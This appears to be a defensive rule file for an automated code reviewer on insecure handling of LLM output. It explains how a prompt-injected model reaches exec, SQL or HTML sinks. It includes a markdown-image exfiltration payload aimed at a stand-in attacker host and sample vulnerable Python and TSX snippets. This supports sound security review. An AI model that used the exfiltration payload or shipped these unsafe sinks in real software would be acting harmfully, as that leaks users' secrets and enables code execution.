---
id: technology.ai_ml.insecure_output_handling
title: "LLM: Insecure Output Handling"
category: technology
vulnerabilityClass: insecure_output_handling
appliesToStack: LLM applications whose output reaches a downstream sink
requiresAnyTag: ["llm-api", "llm-app", "llm-agent"]
deepOnly: false
reviewPass: 2
owaspRefs:
  - "OWASP LLM05:2025 Improper Output Handling"
  - "A03:2021 Injection"
cweRefs:
  - "CWE-79"
  - "CWE-94"
  - "CWE-78"
realWorldReferences:
  - title: "OWASP Top 10 for LLM — Improper Output Handling (LLM output treated as trusted by downstream components)"
    url: "https://genai.owasp.org/llmrisk/llm05-improper-output-handling/"
    type: security_blog
  - title: "Markdown-image data exfiltration via LLM output (Johann Rehberger / Embrace the Red — the 'not so smart' image rendering class)"
    url: "https://embracethered.com/blog/posts/2023/data-exfiltration-in-azure-openai-playground-fixed/"
    type: security_blog
  - title: "LangChain — RCE via unsanitized LLM output passed to Python/SQL execution chains (multiple CVEs, e.g. CVE-2023-29374)"
    url: "https://github.com/advisories/GHSA-fprp-p869-w6q2"
    type: vendor_security_advisory
quickModeSummary: >
  Treat LLM output as untrusted user input, because an injected model produces
  attacker-controlled text. Find every place model output flows into a sink
  without sanitization: rendered as HTML/markdown (→ XSS, or image/link
  exfiltration), interpolated into SQL/shell/eval/code execution (→ injection/
  RCE — the LangChain PythonREPL/SQL-chain class), used as a file path or URL
  (→ traversal/SSRF), or passed to another system as a command. The fix is the
  same as for any untrusted data: encode/escape at the sink, parameterize,
  allow-list, and never `eval` model output. Flag model output reaching a
  dangerous sink with no sanitization between.
fileSelectionHint:
  roles: ["service", "controller", "route_handler", "agent", "view", "tool"]
  matchImports: ["openai", "@anthropic-ai/sdk", "langchain", "@langchain/core", "llamaindex"]
  matchAuthMapTags: ["llm-api", "llm-app"]
  maxFiles: 12
  priorityOrder: ["tool", "agent", "service", "view"]
severityHeuristics:
  critical:
    - "LLM output is passed to a code/command execution sink — eval/exec, a Python/JS REPL tool, os.system/child_process, a SQL string, or a template compiled at runtime — enabling injection or remote code execution when the model is injected"
  high:
    - "LLM output is rendered as HTML/markdown without sanitization, enabling stored/reflected XSS, or an image/link whose URL the model controls (data exfiltration channel)"
    - "LLM output is used as a file path, URL, or downstream API parameter without validation, enabling path traversal, SSRF, or unauthorized calls"
  medium:
    - "LLM output flows into a sink with partial sanitization whose completeness is unclear, or is used to construct a query where some fields are parameterized but at least one is interpolated from model text"
  low:
    - "LLM output is displayed as plain, escaped text with no downstream execution/rendering/parameter use — the standard safe case; confirm the sink is inert before dismissing"
graphNodeMapping:
  primaryNodeType: component
  primaryNodeId: "component:llm_boundary"
  relatedNodeIds: ["component:input_validation", "component:remote_code_execution"]
graphEdgeMapping:
  - relation: causes
    from: "component:llm_boundary"
    to: "component:remote_code_execution"
  - relation: depends_on
    from: "component:llm_boundary"
    to: "component:input_validation"
commonAiCodingMistakes:
  - "AI wires an LLM to a code-execution or SQL tool (LangChain PythonREPLTool, an 'agent that runs the query it writes') and executes the model's output directly — a prompt-injected model then achieves RCE/SQLi, the exact LangChain advisory class."
  - "AI renders model output as markdown/HTML in the chat UI without sanitizing, so injected output containing `<script>` or `![](http://attacker/?d=...)` runs or exfiltrates in the victim's browser."
  - "AI uses model output as a filename ('save the report the model named') or a URL the server then fetches, without validation, yielding path traversal or SSRF."
  - "AI trusts model output to be well-formed JSON and passes it into a downstream call without schema validation, so malformed/injected fields flow onward."
  - "AI treats model output as safe because 'it's just the AI', forgetting the model is downstream of untrusted input and is therefore an untrusted source itself."
falsePositiveGuardrails:
  - "Do not flag model output that is only displayed as escaped plain text (no HTML/markdown rendering, no execution, no parameter use) — that is inert and safe."
  - "Model output parsed into a strictly validated schema/enum and then used only via validated fields is handled correctly — confirm the validation rejects unexpected shapes before dismissing, and that no raw field is interpolated into a sink."
  - "Output rendered as markdown through a sanitizer that strips scripts and blocks auto-loading of arbitrary-domain images/links is the correct rendering pattern — the control is the sanitizer/egress policy, confirm it covers the vectors."
  - "SQL/command construction that parameterizes or allow-lists the model-derived value (rather than string-interpolating it) is safe — the concern is specifically interpolation of raw model text into an executable sink."
---

## Root Cause Explanation

The core mistake is a trust asymmetry: developers treat LLM output as if it
came from a trusted internal component, when in fact the model sits *downstream
of untrusted input* and can be steered by prompt injection. So LLM output must
be handled with exactly the same suspicion as raw user input. Whenever that
output flows into a sink that interprets it — an HTML renderer, a code/SQL/shell
executor, a file path, a URL, a downstream API — the classic injection
vulnerabilities reappear, now reachable through the model.

The highest-impact version is execution. "Agent that writes and runs code/SQL"
patterns (LangChain's PythonREPL and SQL chains produced real CVEs) execute the
model's output directly; a single prompt injection anywhere upstream becomes
remote code execution. The rendering version — model output shown as
markdown/HTML — yields XSS and the markdown-image exfiltration channel, where an
injected model emits `![](https://attacker/?d=<secrets>)` and the victim's
browser auto-loads it. The fix is not model-side; it is standard sink-side
hygiene: escape at render, parameterize queries, allow-list paths/URLs, validate
output against a schema, and never `eval` model text.

## Vulnerable Patterns

```python
# Execution of model output — RCE
code = llm.predict("write python to answer: " + q)
exec(code)                                # or PythonREPLTool().run(code)

db.run(llm.predict("write SQL for: " + q))  # SQL injection via the model
```

```tsx
// Rendered as HTML/markdown — XSS + image exfiltration
<div dangerouslySetInnerHTML={{ __html: marked(modelOutput) }} />
```

Correct: escape/sanitize at the sink, parameterize, validate.

```tsx
<div>{modelOutput}</div>                        // escaped plain text
const safe = sanitizeHtml(marked(modelOutput)); // sanitizer + egress policy
```

## Data Flow Tracing Guide

1. For each LLM call, follow its output. Where does it go — display, execution,
   query, file/URL, downstream API?
2. Classify each sink: inert (escaped text) vs. dangerous (HTML/markdown render,
   code/SQL/shell exec, path/URL, unvalidated downstream param).
3. For dangerous sinks, check for sanitization/parameterization/validation
   between the model and the sink.
4. Remember the model is untrusted-by-proxy: an upstream prompt injection makes
   the output attacker-controlled, so "the model wouldn't do that" is not a
   defense.

## Evidence Checklist

- [ ] The LLM call and the exact sink its output reaches, quoted.
- [ ] The sink's danger class (render/exec/query/path/param) stated.
- [ ] The sanitization/parameterization present or absent between them.
- [ ] A concrete injected-output payload and its effect at the sink.

## Attack Scenario Template

> An attacker prompt-injects the model (directly or via ingested content). At
> [file:line], the model's output is [executed / rendered as HTML / interpolated
> into SQL / used as a URL] with no [sanitization/parameterization], so the
> attacker-controlled output achieves [RCE / XSS / SQLi / SSRF], resulting in
> [impact].

## Graph Mapping Instructions

- Ensure a `component:llm_boundary` node exists.
- Execution-sink findings add a `causes` edge from the finding node toward a
  `component:remote_code_execution` node; note the RCE class in `reasoning`.
- Render/exfiltration findings add an `exposes` edge toward the leaked data.
- Each finding is a `finding:<uuid>` vulnerability node with a `causes` edge
  from `component:llm_boundary`.
